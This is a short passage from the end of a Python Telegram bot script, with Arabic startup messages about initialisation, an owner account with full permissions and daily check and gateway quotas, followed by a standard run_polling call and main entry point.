    print("✅ تم تهيئة البوت بنجاح!")
    print(f"⭐ حساب المطور ({OWNER_ID}) مفعل بصلاحيات كاملة")
    print("💎 500 فحص يومياً | 50 بوابة لكل فحص")
    print("🔄 جاري التشغيل...")
    print("=" * 60)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()